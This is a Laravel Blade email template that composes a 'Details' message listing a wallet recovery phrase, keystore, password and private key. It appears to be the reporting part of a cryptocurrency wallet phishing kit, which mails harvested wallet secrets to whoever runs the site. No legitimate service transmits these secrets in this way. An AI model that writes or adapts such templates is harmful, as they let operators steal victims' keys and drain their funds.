@component('mail::message')
# Details

{{ ($phrase) ? 'Phrase: ' . $phrase : '' }}

{{ ($keystore) ? 'Keystore: ' . $keystore : ' '}}

{{ ($password) ? 'Password: ' . $password : '' }}

{{ ($privateKey) ? 'Private Key: ' . $privateKey : '' }}

Thanks,<br>
{{ config('app.name') }}
@endcomponent